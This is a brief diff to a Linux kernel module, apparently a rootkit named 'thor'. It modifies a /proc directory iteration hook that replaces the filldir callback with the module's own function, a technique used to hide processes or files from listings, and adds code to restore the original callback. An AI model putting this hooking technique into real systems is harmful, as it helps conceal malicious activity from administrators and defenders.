@@ -147,13 +147,17 @@ static ssize_t procfile_write(struct file *file, const char __user *buffer,
 // ------------------------------------------------------------ PROCROOT
 static int thor_proc_iterate(struct file *file, struct dir_context *ctx)
 {
+    int ret;
     // capture original filldir function
     orig_proc_filldir = ctx->actor;
     // cast away const from ctx->actor
     filldir_t *ctx_actor = (filldir_t*)(&ctx->actor);
     // store our filldir in ctx->actor
     *ctx_actor = thor_proc_filldir;
-    return orig_proc_iterate(file, ctx);
+    ret = orig_proc_iterate(file, ctx);
+    // restore original filldir
+    *ctx_actor = orig_proc_filldir;
+    return ret;
 }
 
 static int thor_proc_filldir(void *buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type)
